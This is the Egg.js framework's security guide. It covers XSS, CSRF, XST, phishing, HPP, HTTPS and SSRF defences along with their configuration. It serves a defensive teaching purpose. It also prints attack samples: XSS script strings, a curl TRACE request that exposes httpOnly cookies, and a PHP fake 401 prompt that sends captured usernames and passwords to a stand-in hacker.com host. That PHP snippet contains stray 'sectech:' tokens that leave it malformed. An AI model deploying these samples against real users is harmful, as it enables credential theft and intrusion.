title: Security
---

##  Concept of Web Security

There are a lot of security risks in Web applications, the risk will be used by hackers, while distort Web page content, or steal website internal data, further more, malicious code maybe embedded in the Web page, make users be weak. Common security vulnerabilities are as follows:

- XSS attack: inject scripts into Web pages, use JavaScript to steal user information, then induce user actions.
- CSRF attack: forgery user requests to launch malicious requests to the site.
- phishing attacks: use the site's links or images to create phishing traps.
- http parameter pollution: by using imperfect validation of parameter format, the server will be injected with parameters.
- remote code execution: users could implement command through browser, due to the server did not perform function against doing filtering, lead to malicious code execution.

The framework itself has a rich solution for common security risks on the Web side:

- use [extend](https://github.com/eggjs/egg/blob/master/docs/source/zh-cn/basics/extend.md) mechanism to extend Helper API, various template filtering functions are provided to prevent phishing or XSS attacks.
- Support of common Web security headers.
- CSRF defense.
- flexible security configuration that matches different request urls.
- customizable white list for safe redirect and url filtering.
- all kinds of template related tools for preprocessing.

Security plug-ins [egg-security](https://github.com/eggjs/egg-security) are built into the framework, provides default security practices.

### Open or close the configuration

Note: it is not recommended to turn off the functions provided by the security plug-ins unless the consequences are clearly confirmed.

The security plug-in for the framework opens by default, if we want to close some security protection, directly set the `enable` attribute to false. For example, close xframe precautions:


```js
exports.security = {
  xframe: {
    enable: false,
  },
};
```

### match and ignore

Match and ignore methods and formats are the same with[middleware general configuration](../basics/middleware.md#match%20and%20ignore).

If you want to set security config open for a certain path, you can configure `match` option.

For example, just open csp when path contains `/example`, you can configure with the following configuration:

```js
exports.security = {
  csp: {
    match: '/example',
    policy: {
      //...
    },
  },
};
```

If you want to set security config disable for a certain path, you can configure match option.

For example, just disable xframe when path contains `/example` while our pages can be embedded in cooperative businesses , you can configure with the following configuration:

```js
exports.security = {
  csp: {
    ignore: '/example',
    xframe: {
      //...
    },
  },
};
```

If you want to close some security protection against internal IP:

```js
exports.security = {
  csrf: {
    // To determine whether to ignore the method, request context "context" as the first parameter
    ignore: ctx => isInnerIp(ctx.ip),
  },
}
```

We'll look at specific scenarios to illustrate how to use the security scenarios provided by the framework for Web security precautions.

## Prevention of security threat `XSS`

[XSS](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS))（cross-site scripting）is the most common Web attack, which focus on "cross-domain" and "client-side execution."

XSS attacks generally fall into two categories:

- Reflected XSS
- Stored XSS

### Reflected XSS

Reflective XSS attacks, mainly because the server receives insecure input from the client, triggers the execution of a Web attack on the client side. Such as:

Search for items on a shopping site, and results will display search keywords. Now you fill in the search keywords `<script>alert('handsome boy')</script>`, then click search. If page does not filter the keywords, this code will be executed directly on the page, pop-up alert.

#### Prevention

Framework provides `helper.escape()` method to do string XSS filter.

```js
const str = '><script>alert("abc") </script><';
console.log(ctx.helper.escape(str));
// => &gt;&lt;script&gt;alert(&quot;abc&quot;) &lt;/script&gt;&lt;
```

When the site need to output the result of user input directly, be sure to use `helper.escape()` wrapped. Such as in [egg-view-nunjucks] will overwrite the built-in `escape`

In another case, the output of server's interface will be provided to JavaScript to use. This time you need to use `helper.sjs()` for filtering.

`helper.sjs()` is used to output variables in JavaScript (including events such as onload), and do JavaScript ENCODE for characters in variables.
All characters will be escaped to `\x` if there are not in whitelist, to prevent XSS attacks, also ensure the correctness of the output in JavaScript.

```js
const foo = '"hello"';

// not use sjs
console.log(`var foo = "${foo}";`);
// => var foo = ""hello"";

// use sjs
console.log(`var foo = "${this.helper.sjs(foo)}";`);
// => var foo = "\\x22hello\\x22";
```

There is also a case that sometimes we need to output json in JavaScript, which is easily exploited as a XSS vulnerability if it is not escaped. Framework provides `helper.sjson()` macro to do json encode, it will traverse the key in a json, all the character in the key's value will be escaped to `\x` if there are not in whitelist, to prevent XSS attacks, while keep the json structure unchanged.
If you need to output a JSON string for use in JavaScript, please use `helper.sjson(variable name)` to escape.

**The processing process is more complicated, the performance loss is larger, please use only if necessary**

Example:

```html
  <script>
    window.locals = {{ helper.sjson(locals) }};
  </script>
```

### Stored XSS

Stored XSS attacks are stored on the server by submitting content with malicious scripts that will be launched when others see the content. The content is typically edited through some rich text editors, and it is easy to insert dangerous code.

#### Prevention

Framework provides  `helper.shtml()` to do XSS filtering.

Note that you need to use SHTML to handle the rich text (which contains the text of the HTML code) as a variable directly in the template.
Use SHTML to output HTML tags, while executing XSS filtering, then it can filter out illegal scripts.

**The processing process is more complicated, the performance loss is larger, please use only if you need to output html content**

Example：

```js
// js
const value = `<a href="http://www.domain.com">google</a><script>evilcode…</script>`;
```

```html

// template
<html>
<body>
  {{ helper.shtml(value) }}
</body>
</html>
// => <a href="http://www.domain.com">google</a>&lt;script&gt;evilcode…&lt;/script&gt;

```

Shtml based on [xss](https://github.com/leizongmin/js-xss/) , and add filters by domain name.

- [defaule rule](https://github.com/leizongmin/js-xss/blob/master/lib/default.js)
- [custom rule](http://jsxss.com/zh/options.html)

For example, only support `a` label, and all other properties except `title` are filtered:  `whiteList: {a: ['title']}`

options:

- `config.helper.shtml.domainWhiteList: []` extend whilelist used by "href" and "src"

Note shtml uses a strict whitelisting mechanism, not only filter out the XSS risk strings, all tags or attrs outside [the default rules] (https://github.com/leizongmin/js-xss/blob/master/lib/default.js) will be filtered out.

For example, tag `HTML` is not in the whitelist.

```js
const html = '<html></html>';

// html
{{ helper.shtml(html) }}
// empty output
```

Due to not in the whitelist, common properties like `data-xx` will be filtered.

So, it is important to pay attention to the use of shtml, which is generally aimed at the rich text input from users, please avoid abuse, which can be restricted and affect the performance of the service.

Such scenarios are generally like BBS, comment system, etc., even if does not support HTML content such as BBS input, do not use this Helper, direct use `escape` instead.

### JSONP XSS

JSONP's "callback" parameter is very dangerous, it has two kinds of risks that might lead to XSS

1. Callback parameter will truncate js code, the special characters like single quotation, double quotation or line breaks, both are at risk.

2、Callback parameter add tag maliciously(such as `<script>`), cause XSS risk.

Refer to [JSONP security technic](http://blog.knownsec.com/2015/03/jsonp_security_technic/)

Within the framework, the [jsonp-body](https://github.com/node-modules/jsonp-body) is used to make jsonp requests safe.

Defense content:

* maximum 50 character limit for the name of callback function
* callback function name only allow `[`, `]`, `a-zA-Z0123456789_`, `$`, `.` to prevent XSS or utf-7 XSS attacks, etc.

Configration:

* callback - default is `_callback`, you can rename
* limit - callback function name length limit, default is 50.

### Other XSS precautions

Browser itself has some protection against all kinds of attacks, they generally take effect by opening the Web security headers. The framework has built-in support for some common Web security headers.

#### CSP

CSP is short for Content Security Policy, It is mainly used to define which resources the page can load and reduce the occurrence of XSS.

The framework supports the CSP configuration, but is closed by default, which can effectively prevent XSS attacks from happening. To configure the CSP, you need to know the policy strategy of CSP first, the details you can refer to [what CSP] (https://www.zhihu.com/question/21979782).

#### X-Download-Options:noopen

Opened by default, introduced in IE8 to control visibility of the "Open" button on the file download dialog.

Refer to http://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx

#### X-Content-Type-Options:nosniff

Disable IE8 automatically sniffer such as `text/plain` rendered by `text/HTML` , especially when the content of this site is not credible.

#### X-XSS-Protection

Some XSS detection and precautions provided by Internet explorer, enabled by default

- close default is false，equal to `1; mode=block`

## Prevention of Security Threat `CSRF`

[CSRF or XSRF](https://www.owasp.org/index.php/CSRF) is short for Cross-site request forgery, also called  `One Click Attack` or `Session Riding`, is a malicious use of the site.

CSRF attack will launch a malicious fake request for the site, which seriously affects the security of the site. Therefore, the framework has a built-in CSRF preparedness plan.

### Prevention

In general, there are some common [precautions](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29_Prevention_Cheat_Sheet#CSRF_Specific_Defense) for CSRF attacks. Briefly introduce several common precautions:

- Synchronizer Tokens：When the response page is rendered, token is rendered in the page, which will be submitted through a hidden input when a form is submitted.

- Double Cookie Defense：The token will be stored in client Cookie, Cookie will be submitted when you submit a post request, then you can get the token, and submit the token through header or body, service side will compare and check it.

- Custom Header：Trust request with specific header（like `X-Requested-With: XMLHttpRequest`）. This can be bypassed, so frameworks like rails and django [give up the guard](https://www.djangoproject.com/weblog/2011/feb/08/security/).

The framework combines these precautions to provide a configurable CSRF prevention strategy.

#### Usage

##### Submit Form with CSRF

In synchronous rendering the page, you should add a parameter name called `_csrf` in the form's submit url, the value is `ctx.csrf`, when user submitting this form , CSRF token will be submitted:

```html
<form method="POST" action="/upload?_csrf={{ ctx.csrf | safe }}" enctype="multipart/form-data">
  title: <input name="title" />
  file: <input name="file" type="file" />
  <button type="submit">upload</button>
</form>
```

Fields that pass the CSRF token can be changed in the configuration:

```js
// config/config.default.js
module.exports = {
  security: {
    csrf: {
      queryName: '_csrf', // CSRF token parameter name passed through query, default is _csrf
      bodyName: '_csrf', // CSRF token parameter name passed through body, default is _csrf
    },
  },
};
```

In order to prevent the [BREACH attack](http://breachattack.com/), CSRF token rendered on the page will be changed everytime request changed, and the view plug-in, such as `egg-view-nunjucks`, will automatically inject the hidden field in Form without any perception of the application developer.

##### AJAX Request

In the default configuration, the token is set in the Cookie, which can be fetched from the Cookie and sent to the server through query, body, or header when an AJAX request is requested.

In jQuery:

```js
var csrftoken = Cookies.get('csrfToken');

function csrfSafeMethod(method) {
  // these HTTP methods do not require CSRF protection
  return (/^(GET|HEAD|OPTIONS|TRACE)$/.test(method));
}
$.ajaxSetup({
  beforeSend: function(xhr, settings) {
    if (!csrfSafeMethod(settings.type) && !this.crossDomain) {
      xhr.setRequestHeader('x-csrf-token', csrftoken);
    }
  },
});
```

The fields that pass the CSRF token through the header can also be changed in the configuration:

```js
// config/config.default.js
module.exports = {
  security: {
    csrf: {
      headerName: 'x-csrf-token', // CSRF token passed through header, default is x-csrf-token
    },
  },
};
```

#### Session vs Cookie Store

By default, the framework will present the CSRF token in a Cookie to facilitate AJAX requests. But all subdomains can set cookies, so when our application cannot  controll all subdomains, there may be a risk of CSRF attack stored in the Cookie. The framework provides a configuration that token can be stored in the Session.

```js
// config/config.default.js
module.exports = {
  security: {
    csrf: {
      useSession: true, // default is false，if set to true , it will store csrf token in Session
      cookieName: 'csrfToken', // Field in Cookie , default is csrfToken
      sessionName: 'csrfToken', // Filed in Session , default is csrfToken
    },
  },
};
```

#### Ignore JSON request(deprecated)

**Notice: this configure is deprecated, the attacker can bypass it through [flash and 307](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/), please don't enable it in production environment!**

With security policy protection [SOP](https://en.wikipedia.org/wiki/Same-origin_policy), basically all modern browsers do not allow cross domain request when content-type is set to JSON, so we can just leave out JSON request.

```js
// config/config.default.js
module.exports = {
  security: {
    csrf: {
      ignoreJSON: true, // default is false，if set to be true ,it will leave out all request which content-type is `application/json`
    },
  },
};
```

#### Refresh CSRF token


As CSRF token is stored in Cookie, once the user switches in the same browser, a new login user will still use the old token (old user used) before, this will bring certain security risks, so everytime user do login, website must refresh  **CSRF token**.

 ```js
 // login controller
 exports.login = async function (ctx) {
   const { username, password } = ctx.request.body;
   const user = await ctx.service.user.find({ username, password });
   if (!user) ctx.throw(403);
   ctx.session = { user };

   // call rotateCsrfSecret to refresh CSRF token
   ctx.rotateCsrfSecret();

   ctx.body = { success: true };
 }
 ```

## Prevention of Security Threat `XST`

[XST](https://www.owasp.org/index.php/XST) is short for `Cross-Site Tracing`, client send TRACE request to server, if the server implement TRACE responding by standard, the complete header information of the request will be returned in response body. This way, client can get some sensitive header fields, such as httpOnly cookies.

Below, we implement a simple TRACE support server based on Koa:

```js
  var koa = require('koa');
  var app = koa();

  app.use(async function (ctx, next) {
    ctx.cookies.set('a', 1, { httpOnly: true });
    if (ctx.method === 'TRACE') {
      var body = '';
      for (header in ctx.headers) {
        body += header + ': ' + ctx.headers[header] + '\r\n';
      }
      ctx.body = body;
    }
    await next;
  });

  app.listen(7001);
```

You can send a GET request first `curl -i http://127.0.0.1:7001` when service started, you will get response below:

```
HTTP/1.1 200 OK
X-Powered-By: koa
Set-Cookie: a=1; path=/; httponly
Content-Type: text/plain; charset=utf-8
Content-Length: 2
Date: Thu, 06 Nov 2014 05:04:42 GMT
Connection: keep-alive

OK
```

Then server sets an httpOnly Cookie `a` to 1, it is not possible to get it through the script in the browser environment.

Then we send a TRACE method request to the server with Cookie `curl -X TRACE -b a=1 -i http://127.0.0.1:7001`, and will get response below:

```
  HTTP/1.1 200 OK
  X-Powered-By: koa
  Set-Cookie: a=1; path=/; httponly
  Content-Type: text/plain; charset=utf-8
  Content-Length: 73
  Date: Thu, 06 Nov 2014 05:07:47 GMT
  Connection: keep-alive

  user-agent: curl/7.37.1
  host: 127.0.0.1:7001
  accept: */*
  cookie: a=1
```

The complete header information can be seen in the response body, so that we bypass the httpOnly limit and get the cookie a= 1, causing a great risk.

### More

http://www.w3.org/Protocols/rfc2616/rfc2616-sec9.html

http://deadliestwebattacks.com/2010/05/18/cross-site-tracing-xst-the-misunderstood-vulnerability/

### Prevention

The framework has banned three types of dangerous request type: trace, track, options.

## Prevention of Security threats `phishing attacks`

There are many ways to Phishing, here will introduce url Phishing, photo Phishing and iframe Phishing.

### URL Phishing

The server side does not check and control the incoming redirect url variable, which can lead to malicious construction of any malicious address, then can induce users to redirect to malicious websites.

Due to redirect from a trusted site, users will be more trust, so redirect risk is commonly used in phishing attacks, by going to a malicious web site and cheat users enter the user name and password to steal user information, make money trading or deceive users;

It may also cause XSS attact (mainly use 302 redirect often, set HTTP response headers: `Location: url`, if the url contains a CRLF, it could partition the HTTP response headers, make the back part falls to HTTP body, leading to XSS).

### Prevention

- If the redirect url can be determined in advance, including the value of the url and parameters, you can configured in the background first. If do redirect, directly preach corresponding index of url, and find corresponding specific url  then redirect through index;
- If the redirect url is not previously determined, but it is generated by server background (not passing by user's parameter), you can make a redirect link, then  sign it;
- if 1 and 2 are not satisfied, url could not determine beforehand and only pass through the front end of the incoming parameters, url must be validated before redirect, to judge whether it within the application authorization whitelist.

The framework provides a safe redirect method to avoid this risk by configuring a whitelist.

* `ctx.redirect(url)` If redirect url is not in the whitelist of configuration, it is forbidden.
* `ctx.unsafeRedirect(url)` Allow all redirects, It is generally not recommended to use after a clear understanding of possible risks.

Safety plan covers the default `ctx.redirect` method, all redirects will go through security domain.

You need to do the following configuration in the application configuration file if user use `ctx.redirect` method:

```js
// config/config.default.js
exports.security = {
  domainWhiteList:['.domain.com'],  // security domain while list, start with .
};
```

If user did not configure `domainWhiteList` or `domainWhiteList` array is empty, default will release all redirect requests, that is equal to `ctx.unsafeRedirect(url)`

### Photo Phishing

If website allow users insert unverified images into the web page, that will make a risk of Phishing.

Like common `401 Phishing` for example, when user accessing the page, it pops up a verification page to let user input account and password, when user input, account and password will be stored in the hacker's server.

Usually this kind of situation will appear in `<img src=$url />`, and not verify the ` $url ` whether within the domain name white list.

Attacker can construct the following code in his own server:

401.php, used to pop up 401 window, then record user information:

```php
  <?php
      header('WWW-Authenticate: Basic realm="No authorization"');
      header('HTTP/1.1 401 Unauthorized');
          $domain = "http://hacker.com/fishing/";
          if ($_SERVER[sectech:'PHP_AUTH_USER'] !== null){
                  header("Location: ".$domain."record.php?a=".$_SERVER[sectech:'PHP_AUTH_USER']."&b=".$_SERVER[sectech:'PHP_AUTH_PW']);
          }
  ?>
```

Then attacker generate an image url`<img src="http://xxx.xxx.xxx/fishing/401.php?a.jpg//" />`.

If user access the page, it will popup a window, and let user type in user's name and password, then account and password will be stored in the hacker's server.

### Prevention

Framework provides `.surl()` macro to do url filtering.It is Used to parse the url in the HTML tags in place (such as `<a href ="" /><img src=""/>`), other places are not allowed to use.

You can add `helper.surl($value)` in the template to output variable.

**note: in places where you need to parse the url, you must add double quotes outside of surl, or you will result in XSS vulnerabilities.**

Do not use `surl`

```html
<a href="$value" />
```

output:

```html
<a href="http://ww.safe.com<script>" />
```

Use `surl`

```html
<a href="helper.surl($value)" />
```

output:

```html
<a href="http://ww.safe.com&lt;script&gt;" />
```

### Iframe Phishing

[Iframe Phishing](https://www.owasp.org/index.php/Cross_Frame_Scripting) By embedding iframe into the hacked page, the attacker can direct users to click on the iframe's dangerous website or even cover it, affecting the normal function of the site and hijacking the user's click operation.

Framework provides `X-Frame-Options` this security header to prevent iframe Phishing. The default value is `SAMEORIGIN`, which allows only the same domain to embed this page as an iframe.

This configuration can be turned off when you need to embed some trusted third-party web pages.

## Prevention of Security threats `HPP`

HTTP protocol allows the parameters of the same name appears many times, due to the implementation of the application is not standard, the attacker from the distribution of parameters of transmission key and the value of different parameters, will cause to bypass the consequences of some protection.

The possible security threats to HPP are:

- bypass protection and parameter checking.
- generate logical vulnerabilities and errors that affect application code execution.

### More

- https://www.owasp.org/index.php/Testing_for_HTTP_Parameter_pollution_(OTG-INPVAL-004)
- http://blog.csdn.net/eatmilkboy/article/details/6761407
- https://media.blackhat.com/bh-us-11/Balduzzi/BH_US_11_Balduzzi_HPP_WP.pdf
- ebay RCE risk：http://secalert.net/2013/12/13/ebay-remote-code-execution/

### How to Protect

The framework itself forces the use of the first parameter when the client transports the same key and value different parameters, so it does not lead to an HPP attack.

## [man-in-middle attack](https://www.owasp.org/index.php/Man-in-the-middle_attack) with HTTP / HTTPS

HTTP is a widely used protocol for Web applications, responsible for Web content requests and acquisitions. Content request will across lots of "middleman", mainly in network link, ACTS as the content of the entrance to the browser, router, WIFI providers, communications operators. if you use a proxy, over the wall software will introduce more "middleman". Because the path and parameters of the HTTP request are explicitly written, these "middleman" can monitor, hijack, and block HTTP requests, it is called man-in-middle attack.

In the absence of HTTPS, ISPs can jump the link directly to an AD when the user initiates a request, or change the search results directly into their own ads. If there is a BUG in the hijacking code, the user will not be able to use the website, the white screen will appear.

Data leakage, request hijacking, content tampering, etc., the core reason is that HTTP is completely naked, and the domain name, path and parameters are clearly visible to the middle people. HTTPS does this by encrypting requests to make them more secure to users. In addition to protecting the interests of users, it can also avoid the traffic being held hostage to protect its own interests.

Although HTTPS is not absolute security, the organization that holds the root certificate and the organization that controls the encryption algorithm can also conduct a man-in-middle attack. But HTTPS is the most secure solution under the current architecture, and it significantly increases the cost of man-in-middle attack.

So, if you use the Egg framework to develop web site developers, please be sure to update your website to HTTPS.

For HTTPS, one should pay attention to is the HTTP transport security (HSTS) strictly, if you don't use HSTS, when a user input url in the browser without HTTPS, the browser will use HTTP access by default.

Framework provides `HSTS Strict-Transport-security`, this header will be opened by default, then let the HTTPS site not redirect to HTTP. If your site supports HTTPS, be sure to open it.If our Web site is an HTTP site, we need to close this header.

The configuration is as follows:

- maxAge one yeah for default `365 * 24 * 3600`。
- includeSubdomains default is false, you can add subdomain to confirm all subdomains could be accessed by HTTPS.

## SSRF Protection

In a [Server-Side Request Forgery (SSRF)](https://www.owasp.org/index.php/Server_Side_Request_Forgery) attack, the attacker can abuse functionality on the server to read or update internal resources.

Generally, SSRF are common in that developers directly request the URL resources passed in by the client on the server side. Once an attacker passes in some internal URLs, an SSRF attack can be initiated.

### How to Protect

Usually, we will prevent SSRF attacks based on the IP blacklist of intranets. By filtering the IP addresses obtained after resolving domain names, we prohibit access to internal IP addresses to prevent SSRF attacks.

The framework provides the `safeCurl` method on `ctx`, ʻapp` and `agent`, which will filter the specified intranet IP address while doing the network request. In additon of the method are the same as `curl`.

- `ctx.safeCurl(url, options)`
- `app.safeCurl(url, options)`
- `agent.safeCurl(url, options)`

#### Configurations

Calling the `safeCurl` method directly does not have any effect. It also needs to work with security configurations.

- `ipBlackList`(Array) - Configure the intranet IP address list. IP addresses on these network segments cannot be accessed.
- `checkAddress`(Function) - Directly configure a function to check the IP address, and determine whether it is allowed to be accessed in `safeCurl` according to the return value of the function. When returning is not `true`, this IP cannot be accessed. `checkAddress` has a higher priority than `ipBlackList`.


```js
// config/config.default.js
exports.security = {
  ssrf: {
    ipBlackList: [
      '10.0.0.0/8', // support CIDR subnet
      '0.0.0.0/32',
      '127.0.0.1',  // support specific IP address
    ],
    // ipBlackList does not take effect when checkAddress is configured
    checkAddress(ip) {
      return ip !== '127.0.0.1';
    },
  },
};
```

## Other build-in security tools

### ctx.isSafeDomain(domain)

To judge whether a domain is a secure domain. It is configured in the security  configuration, see `ctx.redirect` parts.

### app.injectCsrf(str)

This function provides template preprocessing - the ability to automatically insert CSRF key, which can be automatically inserted CSRF hidden input into all of the form tags, then user will not need to manually write it.

### app.injectNonce(str)

This function provides the template pretreatment - automatically inserted into the `nonce` ability, if the site opens `CSP` safety http header, and want to use `CSP 2.0 nonce` features, you can use this function. Reference [CSP](https://www.zhihu.com/question/21979782).

This function scans the script tag in the template and automatically adds `nonce`.

### app.injectHijackingDefense(str)

For sites that do not open HTTPS, this function can be limited to preventing ISP hijacking.

[egg-view-nunjucks]: https://github.com/eggjs/egg-view-nunjucks
